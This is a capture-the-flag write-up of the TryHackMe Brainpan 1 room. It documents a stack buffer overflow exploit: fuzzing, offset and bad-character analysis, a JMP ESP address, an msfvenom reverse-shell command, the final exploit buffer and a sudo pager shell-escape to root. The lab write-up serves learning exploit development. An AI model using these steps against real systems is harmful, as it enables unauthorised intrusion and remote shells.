# TryHackMe — Brainpan 1 Writeup

A classic stack-based buffer overflow box: recon, fuzzing, offset calculation, bad character analysis, finding a `JMP ESP` gadget, and building a working exploit with `msfvenom`-generated shellcode — followed by a straightforward `sudo` misconfiguration for root.

---

## 1. Reconnaissance

Started with a full port scan.

```
nmap -sC -sV -p- 10.114.168.37
```

Two ports open:
- **9999/tcp** — a custom service (banner: "WELCOME TO BRAINPAN")
- **10000/tcp** — `SimpleHTTPServer 0.6 (Python 2.7.3)`

![01 nmap scan](assets/01-nmap-scan.png)

## 2. Web Enumeration

Ran `gobuster` against the web server on port 10000, found `/bin`. Browsing to `/bin/` revealed a directory listing containing `brainpan.exe`.

```
gobuster dir -u http://10.114.168.37:10000 -w /usr/share/wordlists/dirb/common.txt
curl -s http://10.114.168.37:10000/bin/
wget http://10.114.168.37:10000/bin/brainpan.exe
```

Confirmed as a 32-bit Windows PE executable (`PE32 executable (console) Intel 80386`).

![02 brainpan exe found](assets/02-brainpan-exe-found.png)

## 3. Running the Binary & Fuzzing

Ran `brainpan.exe` under Wine — it binds to port 9999 and waits for connections. Wrote a Python fuzzing script (`fuzz.py`) that sends an increasing buffer of `A`s in 100-byte increments. Attached OllyDbg beforehand and confirmed a crash between 600–700 bytes (unhandled page fault + "Program Error" popup).

![03 fuzzing crash](assets/03-fuzzing-crash.png)

## 4. Finding the Exact Offset & Confirming EIP Control

Generated a unique De Bruijn-style pattern, sent it as the buffer, and read the 4 bytes that landed in EIP from OllyDbg. Located that value's position within the pattern using a Python3 one-liner:

```
python3 -c 'import string, struct; val=struct.pack("<I", 0x35724134).decode("latin-1"); ...; print(f"Exact match at offset {pat.find(val)}")'
```

**Result: exact offset = 524 bytes.**

Rebuilt the buffer as `524 x 'A' + 4 x 'B' + padding of 'C'` and resent it — OllyDbg confirmed EIP cleanly overwritten with `42424242` and ESP pointing directly into the `C` padding, proving full control.

![04 eip offset confirmed](assets/04-eip-offset-confirmed.png)

## 5. Bad Characters & Finding a JMP ESP Gadget

Sent the full byte range (`\x01`–`\xff`) after the offset and compared it against the OllyDbg stack dump — only `\x00` came back as a bad character.

Used OllyDbg's search feature to find a `JMP ESP` instruction inside the binary's own module (no ASLR/DEP on this old binary):

```
JMP ESP → 0x311712F3
```

Plugged this address (little-endian) into the buffer in place of the `B`s, followed by a NOP sled, and confirmed EIP correctly redirected execution to ESP.

![05 badchar and jmp esp](assets/05-badchar-and-jmp-esp.png)

## 6. Generating Shellcode

Generated a Linux x86 reverse shell payload with `msfvenom`, encoding it and excluding the identified bad character:

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -b "\x00" -f python
```

![06 shellcode generated](assets/06-shellcode-generated.png)

## 7. Final Exploit & Getting a Shell

Assembled the final exploit:

```
buffer = b"A"*524 + b"\xF3\x12\x17\x31" + b"\x90"*21 + shellcode
```

Started a listener and sent the payload — caught a reverse shell as user `puck`.

```
nc -lvnp 4444
python buffer-skel.py
```

![07 reverse shell puck](assets/07-reverse-shell-puck.png)

## 8. Privilege Escalation

Stabilized the shell (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, `stty raw -echo; fg`, `export TERM=xterm`) and checked `sudo -l`:

```
User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

The `anansi_util` binary supports `network`, `proclist`, and `manual [command]`. The `manual` action opens a man page via a pager — a classic shell-escape privesc vector:

```
sudo /home/anansi/bin/anansi_util manual nc
```

Inside the `nc` man page pager, escaped to a shell with `!/bin/sh`, landing as `root`.

## 9. Root Flag

```
cd /root
ls -la
cat b.txt
```

Root flag captured — an ASCII art banner pointing to `http://www.techorganic.com` (the box author's site).

![08 root flag](assets/08-root-flag.png)

---

## Summary

Brainpan 1 was a full classic stack buffer overflow chain from start to finish — fuzzing, exact offset calculation, bad character identification, a `JMP ESP` gadget, and custom shellcode via `msfvenom`. Privilege escalation was a straightforward `sudo` misconfiguration with a shell-escape through a pager. Unlike the web/misconfig chains in earlier boxes, this one required binary analysis and debugger work end-to-end — a solid first hands-on exploit-dev exercise before moving into AD-focused rooms.
